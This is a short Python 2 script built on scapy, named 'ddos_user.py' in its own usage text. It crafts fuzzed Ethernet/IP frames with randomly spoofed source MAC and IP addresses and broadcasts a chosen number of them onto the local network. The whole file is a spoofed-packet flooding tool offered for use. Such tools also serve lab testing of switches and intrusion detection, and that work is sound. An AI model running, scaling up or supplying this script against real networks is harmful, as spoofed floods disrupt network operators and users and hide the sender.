import sys, getopt
from scapy.all import *

def main(argv):
	n = 1
	# packet-count = 1
	h = 'ddos_user.py -n <ip-number>'
	try:
		opts, args = getopt.getopt(argv,"hn:",["ip-number="])
	except getopt.GetoptError:
		print h
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print h
			sys.exit()
		elif opt in ("-n", "--ip-number"):
			n = int(arg)

	broadcast_mac_dst="ff:ff:ff:ff:ff:ff"
	
	mac_src = RandMAC()
	ip_src = RandIP()
	ip_dst = RandIP()
	p = fuzz(Ether(src=mac_src, dst=broadcast_mac_dst)/IP(src=ip_src, dst=ip_dst))
	sendp(p, count=n, inter=0.2)

if __name__ == "__main__":
	main(sys.argv[1:])